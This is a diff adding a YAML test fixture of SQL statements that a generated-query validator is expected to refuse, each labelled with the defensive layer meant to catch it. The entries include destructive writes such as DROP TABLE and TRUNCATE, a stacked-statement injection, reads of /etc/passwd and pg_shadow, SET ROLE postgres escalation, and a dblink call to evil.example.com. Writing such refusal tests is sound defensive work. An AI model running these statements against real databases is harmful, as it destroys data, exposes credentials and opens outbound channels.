@@ -1,0 +1,76 @@
+# SQL the generated-query path must refuse.
+#
+# These bypass the LLM entirely and are handed straight to the validator and the
+# connector, because the point is not "would a model write this" — the point is
+# that the platform refuses it whoever wrote it. A validator tested only through
+# a model is tested through a filter that changes weekly.
+#
+# `why` is the layer expected to catch it. More than one usually does; the
+# database role is the backstop that holds when every other layer is bypassed.
+
+- sql: "DROP TABLE customers"
+  why: write statement
+  is_write: true
+
+- sql: "DELETE FROM orders"
+  why: write statement
+  is_write: true
+
+- sql: "UPDATE orders SET order_status = 'shipped'"
+  why: write statement
+  is_write: true
+
+- sql: "INSERT INTO customers (name) VALUES ('x')"
+  why: write statement
+  is_write: true
+
+- sql: "TRUNCATE customers"
+  why: write statement
+  is_write: true
+
+- sql: "SELECT 1; DROP TABLE customers"
+  why: stacked statement
+
+# NOT included as an attack: sqlglot parses the -- correctly, so the DROP is
+# inert comment text and never reaches the database. Listing it would assert a
+# refusal that should not happen, and a corpus that demands the wrong answer is
+# worse than one that is smaller.
+#
+# The stacked-statement case above is the real version of this attack.
+
+- sql: "WITH x AS (DELETE FROM orders RETURNING *) SELECT * FROM x"
+  why: write hidden in a CTE
+  is_write: true
+
+- sql: "SELECT * FROM customers"
+  why: base table, not a curated view
+
+- sql: "SELECT * FROM pg_shadow"
+  why: system catalogue
+
+- sql: "SELECT current_setting('app.tenant_id')"
+  why: reads tenant context
+
+- sql: "SELECT pg_read_file('/etc/passwd')"
+  why: filesystem access
+
+- sql: "COPY customers TO '/tmp/out.csv'"
+  why: filesystem write
+  is_write: true
+
+- sql: "GRANT ALL ON curated.v_orders TO analytics_readonly"
+  why: privilege change
+  is_write: true
+
+- sql: "CREATE TABLE evil (id int)"
+  why: DDL
+  is_write: true
+
+- sql: "SELECT * FROM curated.v_orders UNION SELECT * FROM pg_user"
+  why: union to a system catalogue
+
+- sql: "SET ROLE postgres"
+  why: role escalation
+
+- sql: "SELECT dblink_connect('host=evil.example.com')"
+  why: outbound connection from inside the database
